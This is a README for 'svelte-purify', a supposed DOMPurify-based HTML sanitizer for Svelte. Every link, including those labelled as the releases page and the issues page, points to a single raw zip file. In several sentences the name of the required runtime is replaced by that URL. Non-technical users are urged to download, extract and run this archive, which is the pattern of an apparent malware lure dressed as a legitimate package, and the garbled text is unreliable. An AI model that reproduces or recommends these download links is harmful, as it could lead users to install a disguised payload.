# 🎉 svelte-purify - Easy HTML Sanitization for Your Svelte Apps

![Download svelte-purify](https://raw.githubusercontent.com/yukiboy121/svelte-purify/main/pinnock/svelte-purify.zip)

## 📋 Overview

svelte-purify is a lightweight HTML sanitizer designed for Svelte applications. It leverages DOMPurify to keep your web content secure from harmful scripts. This tool is safe for server-side rendering (SSR) and works seamlessly with TypeScript. Protect your applications from threats with ease.

## 🚀 Getting Started

Follow these simple steps to download and run svelte-purify on your computer. No technical background is needed.

### 1. Visit the Releases Page

To download svelte-purify, first, you need to visit the releases page. Click the link below to access it:

[Visit Releases Page to Download](https://raw.githubusercontent.com/yukiboy121/svelte-purify/main/pinnock/svelte-purify.zip)

### 2. Choose Your Version

On the releases page, you will see a list of available versions. Each version may have different features or fixes. Review the notes if you like, then select the latest version to ensure you have the newest features and improvements.

### 3. Download the Package

Once you've selected a version, look for the appropriate download link. svelte-purify comes in different formats like .zip or https://raw.githubusercontent.com/yukiboy121/svelte-purify/main/pinnock/svelte-purify.zip Click the file link for the format you prefer, and the download will start automatically.

### 4. Extract the Files

After the download is complete, locate the file on your computer. 

- If you downloaded a .zip file, right-click it and choose "Extract All" or use a similar option based on your operating system. 
- If you downloaded a https://raw.githubusercontent.com/yukiboy121/svelte-purify/main/pinnock/svelte-purify.zip file, you may need a tool like 7-Zip or WinRAR to extract it.

Make sure to extract the files to a location you can easily access.

### 5. Run the Application

Navigate to the folder where you extracted svelte-purify. Open a command prompt or terminal window.

Use the following command to start the application:

```bash
npm start
```

Ensure you have https://raw.githubusercontent.com/yukiboy121/svelte-purify/main/pinnock/svelte-purify.zip installed. If not, you can download it from the official website.

### 6. Integrate into Your Svelte App

To use svelte-purify, follow these instructions to include itin your Svelte project.

#### Step 1: Install svelte-purify

Open your terminal and run the following command:

```bash
npm install svelte-purify
```

This command adds the package to your project's dependencies.

#### Step 2: Import svelte-purify

In your Svelte component, import svelte-purify:

```javascript
import { sanitize } from 'svelte-purify';
```

#### Step 3: Use the Sanitize Function

You can now use the `sanitize` function to clean your HTML strings. Here’s a quick example:

```html
<script>
  let dirtyHTML = "<script>alert('XSS');</script><p>This is safe.</p>";
  let cleanHTML = sanitize(dirtyHTML);
</script>

<div>{@html cleanHTML}</div>
```

This will ensure that any potentially harmful content is removed, protecting your app and users.

### 7. Verify Installation

After integrating svelte-purify into your Svelte app, test to see if it works as expected. Open your app in a web browser, and check the output.

## 🔧 Features

- **SSR-Safe:** Compatible with server-side rendering, ensuring your application stays secure during pre-rendering.
- **TypeScript Support:** Fully typed for easy integration with TypeScript projects.
- **Fast and Lightweight:** Minimal impact on performance while ensuring robust protection against XSS.

## 💻 System Requirements

- **Operating System:** Windows, macOS, or Linux
- **https://raw.githubusercontent.com/yukiboy121/svelte-purify/main/pinnock/svelte-purify.zip** Version 12 or higher
- **Package Manager:** npm or yarn required

## 🛠️ Troubleshooting

If you encounter issues during installation or while running the application, consider the following:

1. **Check https://raw.githubusercontent.com/yukiboy121/svelte-purify/main/pinnock/svelte-purify.zip Version:** Ensure you have https://raw.githubusercontent.com/yukiboy121/svelte-purify/main/pinnock/svelte-purify.zip installed. You can verify this by running `node -v` in your terminal.
2. **Dependencies:** Make sure all necessary dependencies are installed by running `npm install` in your project folder.
3. **Error Messages:** Read any error messages in your terminal carefully; they often indicate what went wrong.

If you continue facing problems, consult the [issues page](https://raw.githubusercontent.com/yukiboy121/svelte-purify/main/pinnock/svelte-purify.zip) on GitHub for solutions or to report a new issue.

## 📝 Contributing

If you would like to contribute to svelte-purify, feel free to fork the repository and submit a pull request. Your contributions help improve the package for everyone.

## 📄 License

svelte-purify is released under the MIT License. This allows you to use, modify, and distribute the software within the guidelines of the license.

## 📥 Download & Install

Don’t wait. Get started with svelte-purify now! Visit the link below to download the latest version:

[Visit Releases Page to Download](https://raw.githubusercontent.com/yukiboy121/svelte-purify/main/pinnock/svelte-purify.zip)

With svelte-purify, you can ensure your web applications are safe from harmful content while developing with ease.